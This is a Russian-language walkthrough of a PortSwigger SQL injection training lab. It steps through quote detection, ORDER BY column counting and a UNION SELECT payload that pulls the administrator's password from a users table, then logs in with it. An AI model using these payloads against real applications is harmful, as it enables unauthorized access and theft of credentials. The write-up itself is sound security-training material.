# SQL injection UNION attack, retrieving data from other tables

## Scope

[ссылка на лабу](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

```
https://0afe00cb0435e68b8132b15500ae0073.web-security-academy.net/
```

В данной лабе есть уязвимый к `SQL injection` фильтр категории.

В БД есть талицы с именам `users` и колонками `username` и `password`.

Нужно получить информацию из БД, чтобы зайти в аккаунт `administrator`.

## Notes

Известно, что уязвимость находится в фильтре категорий, поэтому сразу возьму его.

```
https://0afe00cb0435e68b8132b15500ae0073.web-security-academy.net/filter?category=Pets
```

Нужно подобрать обрамление. Пусть запрос выглядит следующим образом:

```SQL
SELECT * FROM table WHERE category = 'Pets'
```

Протестирую пейлоад:

```
Pets' and 0=1-- -
```

![](../images/Pasted%20image%2020250118190234.png)

Страница пустая, значит для обрамления используется одинарные кавычки. Теперь узнаю количество полей в запросе с помощью `ORDEYR BY`:

```
Pets' ORDER BY 10-- -Error
Pets' ORDER BY 5-- -Error
Pets' ORDER BY 3-- -Error
Pets' ORDER BY 2-- -Ok
```

Значит в запросе у меня 2 параметра. Использую `UNION`, чтобы отобразить свои данные:

```
Pets' and false UNION SELECT NULL, NULL-- -Ok
Pets' and false UNION SELECT 1, 2-- -Error
Pets' and false UNION SELECT '1', '2'-- -Ok
```

Теперь попробую добавить поля `username` и `password`:

```
Pets' and false UNION SELECT username, password FROM users WHERE username = 'administrator'-- -ok
```

![](../images/Pasted%20image%2020250118191209.png)

Получил креды: `administrator`:`5j1o1b7ls5ltyvanoo42`. Зайду в аккаунт

![](../images/Pasted%20image%2020250118191253.png)

Ну, все. Я получил власть...
